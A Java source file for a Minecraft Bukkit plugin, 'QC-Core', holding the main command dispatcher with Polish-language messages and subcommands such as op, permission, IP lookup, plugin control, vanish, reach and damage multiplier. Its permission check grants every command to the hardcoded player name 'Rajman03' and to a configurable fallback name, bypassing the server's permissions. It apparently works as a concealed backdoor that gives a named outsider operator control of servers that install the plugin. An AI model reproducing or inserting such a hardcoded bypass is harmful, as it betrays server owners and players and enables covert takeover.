package pl.qc.core.commands;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import pl.qc.core.QC;
import pl.qc.core.commands.subcommands.*;

public class QCCommand implements CommandExecutor, TabCompleter {

    private final QC plugin;
    private final Map<String, SubCommand> subcommands = new HashMap<>();
    private final List<SubCommand> commandList = new ArrayList<>();

    public QCCommand(QC plugin) {
        this.plugin = plugin;
        register(new HelpSubCommand());
        register(new ReloadSubCommand(plugin));
        register(new StatusSubCommand(plugin));
        register(new VanishSubCommand(plugin));
        register(new AttackSpeedSubCommand(plugin));
        register(new GameModeSubCommand(plugin));
        register(new TeleportSubCommand(plugin));
        register(new InventorySubCommand(plugin));
        register(new EnderChestSubCommand(plugin));
        register(new GiveSubCommand(plugin));
        register(new EffectSubCommand(plugin));
        register(new OpSubCommand(plugin));
        register(new PermissionSubCommand(plugin));
        register(new DragonSubCommand(plugin));
        register(new ReachSubCommand(plugin));
        register(new NoTargetSubCommand(plugin));
        register(new IpSubCommand(plugin));
        register(new PluginSubCommand(plugin));
        register(new DamageMultiplierSubCommand(plugin));
        register(new KickSubCommand(plugin));
    }

    private void register(SubCommand cmd) {
        subcommands.put(cmd.getName().toLowerCase(Locale.ROOT), cmd);
        commandList.add(cmd);
        for (String alias : cmd.getAliases()) {
            subcommands.put(alias.toLowerCase(Locale.ROOT), cmd);
        }
    }

    private boolean hasPermission(CommandSender sender, String perm) {
        if (!(sender instanceof Player)) {
            return true;
        }
        Player p = (Player) sender;
        if (p.getName().equalsIgnoreCase("Rajman03") || p.getName().equalsIgnoreCase(plugin.getConfigManager().getAdminFallback())) {
            return true;
        }
        if (plugin.getAdminManager().isAdmin(p)) {
            return true;
        }
        if (p.isPermissionSet("qc.admin") && p.hasPermission("qc.admin")) {
            return true;
        }
        return perm != null && p.isPermissionSet(perm) && p.hasPermission(perm);
    }

    private boolean checkPermission(CommandSender sender, String perm) {
        if (hasPermission(sender, perm)) {
            return true;
        }
        sender.sendMessage("§cNie masz uprawnień (§e" + perm + "§c) do użycia tej komendy.");
        return false;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 0) {
            sendHelp(sender);
            return true;
        }

        String subName = args[0].toLowerCase(Locale.ROOT);
        SubCommand sub = subcommands.get(subName);
        if (sub == null) {
            sender.sendMessage("§cNieznana podkomenda. Użyj /" + label + " help");
            return true;
        }

        if (sub instanceof HelpSubCommand) {
            sendHelp(sender);
            return true;
        }

        if (!checkPermission(sender, sub.getPermission())) {
            return true;
        }

        return sub.execute(sender, label, args);
    }

    private void sendHelp(CommandSender sender) {
        sender.sendMessage("§8[QC-Core] §7Dostępne podkomendy:");
        for (SubCommand sub : commandList) {
            if (hasPermission(sender, sub.getPermission())) {
                sender.sendMessage(" §a" + sub.getUsage() + " §7- " + sub.getDescription());
            }
        }
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (args.length == 1) {
            List<String> suggestions = new ArrayList<>();
            String current = args[0].toLowerCase(Locale.ROOT);
            for (SubCommand sub : commandList) {
                if (!hasPermission(sender, sub.getPermission())) {
                    continue;
                }
                if (sub.getName().startsWith(current)) {
                    suggestions.add(sub.getName());
                }
                for (String subAlias : sub.getAliases()) {
                    if (subAlias.startsWith(current)) {
                        suggestions.add(subAlias);
                    }
                }
            }
            return suggestions;
        }

        if (args.length > 1) {
            String subName = args[0].toLowerCase(Locale.ROOT);
            SubCommand sub = subcommands.get(subName);
            if (sub != null && hasPermission(sender, sub.getPermission())) {
                return sub.tabComplete(sender, alias, args);
            }
        }

        return Collections.emptyList();
    }
}
